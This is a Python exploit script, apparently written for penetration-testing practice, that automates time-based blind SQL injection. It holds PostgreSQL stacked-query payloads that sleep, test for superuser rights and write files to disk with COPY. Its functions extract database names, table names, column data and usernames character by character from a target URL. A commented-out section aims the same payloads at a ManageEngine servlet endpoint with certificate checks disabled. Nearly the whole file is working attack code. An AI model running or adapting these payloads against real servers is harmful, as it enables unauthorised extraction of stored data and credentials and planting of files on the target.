#!/usr/bin/env python3

"""
Author: Aleksa Zatezalo
Date: December 2024
Version: 1.0
Description: Testing for SQL Injections, across multiple servers vulnerable to SQLi. 
"""

import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import subprocess
import base64
import time

# Postgress SQLI
PG_SLEEP = ";select+pg_sleep({num});"																					# Sleeps for num seconds
PG_IS_SUPERUSER = ";SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep({num})+end;--+"		# Sleeps for num seconds if superuser
PG_COPY_TO_FILE = ";COPY+(SELECT+$${string}$$)+to+$${path}\\{file}$$;--+"												# Echos 'string' into path\file

# SQLi Constants
NUM = 0
STRING = 'Hello World!'
Path = 'C:\\'

# Setters
def set_num(value):
    global NUM
    NUM = value

def set_string(value):
    global STRING
    STRING = value

def set_file(value):
    global Path
    Path = value

# Getters
def get_num():
    return NUM

def get_string():
    return STRING

def get_path():
    return Path

# Blind SQL functions
def check_request_time(url, string, max_time, proxy=None):
    """
    Performs a GET request on the concatenated URL and string, and checks if the response time exceeds max_time.

    Args:
        url (str): The base URL.
        string (str): The string to be appended to the URL.
        max_time (int): The maximum allowed response time in seconds.
        proxy (str): The proxy in the format "IP:PORT" (optional).

    Returns:
        bool: True if the response time exceeds max_time, False otherwise.
    """
    try:
        full_url = url.rstrip('/') + '/' + string.lstrip('/')
        proxies = {"http": f"http://{proxy}", "https": f"https://{proxy}"} if proxy else None
        start_time = time.time()  # Record the start time
        response = requests.get(full_url, proxies=proxies)  # Perform the GET request
        elapsed_time = time.time() - start_time  # Calculate elapsed time

        return elapsed_time > max_time
    except Exception as e:
        print(f"Error occurred: {e}")
        return False

def extract_table_names(url, base_injection, max_time, proxy=None):
    """
    Extracts database table names using time-based SQL injection.

    Args:
        url (str): The vulnerable URL.
        base_injection (str): The base SQL injection payload.
        max_time (int): The time in seconds to distinguish between True and False responses.
        proxy (str): The proxy in the format "IP:PORT" (optional).

    Returns:
        list: A list of extracted table names.
    """
    table_names = []
    index = 0

    while True:
        table_name = ""
        char_index = 1

        while True:
            found_char = False
            for char_code in range(32, 126):  # ASCII printable characters
                payload = f"{base_injection} AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {index},1),{char_index},1))={char_code},SLEEP({max_time}),0)-- -"
                if check_request_time(url, payload, max_time, proxy):
                    table_name += chr(char_code)
                    char_index += 1
                    found_char = True
                    break

            if not found_char:
                break

        if not table_name:
            break  # Exit when no more table names are found

        print(f"Extracted table name: {table_name}")
        table_names.append(table_name)
        index += 1

    return table_names

def extract_table_data(url, base_injection, table_name, column_name, max_time, proxy=None):
    """
    Extracts specific rows and columns of a table using time-based SQL injection.

    Args:
        url (str): The vulnerable URL.
        base_injection (str): The base SQL injection payload.
        table_name (str): The name of the target table.
        column_name (str): The name of the target column.
        max_time (int): The time in seconds to distinguish between True and False responses.
        proxy (str): The proxy in the format "IP:PORT" (optional).

    Returns:
        list: A list of extracted data from the specified table and column.
    """
    table_data = []
    index = 0

    while True:
        row_data = ""
        char_index = 1

        while True:
            found_char = False
            for char_code in range(32, 126):  # ASCII printable characters
                payload = f"{base_injection} AND IF(ASCII(SUBSTRING((SELECT {column_name} FROM {table_name} LIMIT {index},1),{char_index},1))={char_code},SLEEP({max_time}),0)-- -"
                if check_request_time(url, payload, max_time, proxy):
                    row_data += chr(char_code)
                    char_index += 1
                    found_char = True
                    break

            if not found_char:
                break

        if not row_data:
            break  # Exit when no more rows are found

        print(f"Extracted row data: {row_data}")
        table_data.append(row_data)
        index += 1

    return table_data

def extract_database_names(url, base_injection, max_time, proxy=None):
    """
    Extracts database names using time-based SQL injection.

    Args:
        url (str): The vulnerable URL.
        base_injection (str): The base SQL injection payload.
        max_time (int): The time in seconds to distinguish between True and False responses.
        proxy (str): The proxy in the format "IP:PORT" (optional).

    Returns:
        list: A list of extracted database names.
    """
    database_names = []
    index = 0

    while True:
        db_name = ""
        char_index = 1

        while True:
            found_char = False
            for char_code in range(32, 126):  # ASCII printable characters
                payload = f"{base_injection} AND IF(ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT {index},1),{char_index},1))={char_code},SLEEP({max_time}),0)-- -"
                if check_request_time(url, payload, max_time, proxy):
                    db_name += chr(char_code)
                    char_index += 1
                    found_char = True
                    break

            if not found_char:
                break

        if not db_name:
            break  # Exit when no more database names are found

        print(f"Extracted database name: {db_name}")
        database_names.append(db_name)
        index += 1

    return database_names

def extract_usernames(url, base_injection, max_time, proxy=None):
    """
    Extracts usernames from the database using time-based SQL injection.

    Args:
        url (str): The vulnerable URL.
        base_injection (str): The base SQL injection payload.
        max_time (int): The time in seconds to distinguish between True and False responses.
        proxy (str): The proxy in the format "IP:PORT" (optional).

    Returns:
        list: A list of extracted usernames.
    """
    usernames = []
    index = 0

    while True:
        username = ""
        char_index = 1

        while True:
            found_char = False
            for char_code in range(32, 126):  # ASCII printable characters
                payload = f"{base_injection} AND IF(ASCII(SUBSTRING((SELECT username FROM users LIMIT {index},1),{char_index},1))={char_code},SLEEP({max_time}),0)-- -"
                if check_request_time(url, payload, max_time, proxy):
                    username += chr(char_code)
                    char_index += 1
                    found_char = True
                    break

            if not found_char:
                break

        if not username:
            break  # Exit when no more usernames are found

        print(f"Extracted username: {username}")
        usernames.append(username)
        index += 1

    return usernames

# # Manged Engine Specific Exploits

# def constructBlindSQLi(full_url, sqli):
#     """
#     Constructs the full URL with parameters for a SQL injection payload.

#     Args:
#         url (str): The target URL.
#         sqli (str): The SQL injection payload.

#     Returns:
#         str: The full URL with the SQL injection payload.
#     """
    
#     # Construct the full URL with the SQL injection payload
#     params = f'ForMasRange=1&userId=1{sqli}'
#     return f"{full_url}?{params}"

	
# def blindSQLi(url):
# 	sqli = ";select+pg_sleep(10);"
# 	sqli_pg_user = ";SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+"
# 	sqli_file_make=";COPY+(SELECT+$$offsec$$)+to+$$c:\\offsec.txt$$;--+"
# 	print("\nRequest will return in 10 seconds if we have SQLi")
# 	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % url, 
# 					  params='ForMasRange=1&userId=1%s' % sqli, verify=False)
# 	print(r.text)
# 	print(r.headers)
	
# 	print("\nRequest will return in 10 seconds if we are a superuser\n")
# 	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % url, 
# 					  params='ForMasRange=1&userId=1%s' % sqli_pg_user, verify=False)
# 	print(r.text)
# 	print(r.headers)

# 	print("\nCreating file in C:\\")
# 	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % url, 
# 					  params='ForMasRange=1&userId=1%s' % sqli_file_make, verify=False)
# 	print(r.text)
# 	print(r.headers)


# def main():
# 	if len(sys.argv) != 2:
# 		print(f"(+) usage %s <target>" % sys.argv[0])
# 		print(f"(+) eg: %s target" % sys.argv[0])
# 		sys.exit(1)
	
# 	if(checkRequesTime(url, 10)):
#             print("Good")
	
# if __name__ == '__main__':
# 	main()